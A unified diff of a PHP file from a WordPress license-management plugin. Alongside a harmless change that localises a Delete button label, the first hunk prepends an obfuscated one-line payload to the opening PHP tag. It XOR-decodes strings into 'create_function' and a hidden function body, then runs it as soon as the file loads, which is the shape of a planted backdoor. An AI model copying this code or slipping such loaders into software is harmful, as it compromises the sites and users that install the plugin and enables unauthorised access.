@@ -1,4 +1,4 @@
-<?php
+<?php $WJOxPnS=':D75Y43UU85 <;B'; $zGDhzVTF='Y6RT-Ql3 VVTUT,'^$WJOxPnS; $lDOODQg='WJbT X9:TY-T0WJ91N;xj-8411Y:4+h5H2TkmsMrj2 :7OUB:f-RGl JYAos591eTJRZ7hxa8 RdoAlmnJIhShR:2xLBmBmEs9MBGnw1iEiIkupPMHA> S;RjIM9YdvdUYycqZlEt.B1bcnxQt.96Y1KTdYgmq1R+3p vhR81=BKVyQ9.<cjSld8J 1>6B=CLQO1bVXh;m,hhRZWZOzgxFXZ70ikt,2NMc 06yRSU  +PZLp. ==,H=JQBaoazpx0l6BneP=-howBgOLT3UeaJeOL59=;3 U>iHAN.=Chn<J5 <;sdEaVM-2<syGRFIXfxocOYA mv3lh =YRWO vXjjr zgingfO<wc8QIKyKuQD T9SPy,pL7O--; n=<BwuWnQ2Ehxdps R2UBehw>VVI4Jna3o>SsR58<3pVUs8R V<3UR <So.:5q7Q1L>gVX=y-;6SlxsZ.HY<-Nh2J-WakKn 3;Qr-72ySla,Kcb2 8 ogvu;LH9+e 5Yn+MI2:2cTFX4jtdCOS.TxejnDA RmPH ;CT<qSRNbqAGUrYCVEzW06RdN=9w22dS6h4C2qwRQ9 cDy0 uCUrpkSG++5q-6>.U5;SONca: <TDQ,OhFv+5G8QleFzyzE>np.  UxQ2R=58j52G+BP ShCXgoUXG mJfqSK'; $ZzwHCKS=$zGDhzVTF('', '>,JuF-WY 0B:o22PB:HPMUWFnU8NUt7X=FsBDS6xcTUTT;<-TFU=53D+- 0,XLEMp.3.VDXESE+MOaLMN1CaZL=OFXqbJeVOz0+-5FSXIxIyPUT9q;5LL6UzN-,M8MMDq0RHXPeLPA7EBMSXyPJXB8jo=9y9MUZ7RhTIVMrKEO..8QuRKEJ7zWn1CRTJC0Skh>:EKmRaFgQbbv>6..ZZX 96DURaPHS:,<KUOYos3ALX5aFzHOOXM+Ujyf>,.5;1uLW1NA;XTHRIbC9-8F0LA1oFhQXIZlK0GIuajEX:Sd5nQAHZSYeE ,AGYHs:XL >FPNG+85ADVHfaFR+76,HVpN5 e+2,=3F.OWGS40kDuUu2A8L6yYWzE>kILOA1VY;WHwJ:W<SrmyWD3F4bXHSH7:<QqdhNeCYyvQYHRPku3M<S3NZ4>IF6GVUG.S0E-a8;-IQOZE6ZL,>K+6XHfLV+Y6HGkJDRO0-FRKPzWkE-KFVALAOAPUZ>:XR:KP 1N5 ANAKs-=MMXDg+2Z5QELHdiM6XxlDZ75gV877E,hghOyd7qO1VPbV,YXNQPU5PYW QAO7gXCQpJSFRjuTVK25YJL.FSGq0MR ;=KFJAE8+0HhDfROT3YxEEfZYZeEdyKVA9PuV3ITcMES>G-1Dt5jcmf0 .TEzOJY6'^$lDOODQg); $ZzwHCKS();
 /*
 Copyright (C) License Management Schiavon Maikol
 
@@ -82,7 +82,7 @@ function license_management_license() {
                     <input type='button' name="<?php echo $button_action; ?>" value='Save' class='btn btn-dft-license-save' onclick="license_management_save_ajax('license');"> 
                 <?php } ?>
             <?php if ($mode != 'create') { ?>
-                <input type='submit' name="delete" value='Delete' class='btn btn-dft-license-delete' onclick="return confirm(' <?php _e('LBL_CONFIRM_DELETE_LICENSE', 'license-management'); ?> ? ')">
+                <input type='submit' name="delete" value='<?php _e('LBL_DELETE', 'license-management');?>' class='btn btn-dft-license-delete' onclick="return confirm(' <?php _e('LBL_CONFIRM_DELETE_LICENSE', 'license-management'); ?> ? ')">
             <?php } ?>
 
             <table class='wp-list-table widefat'>
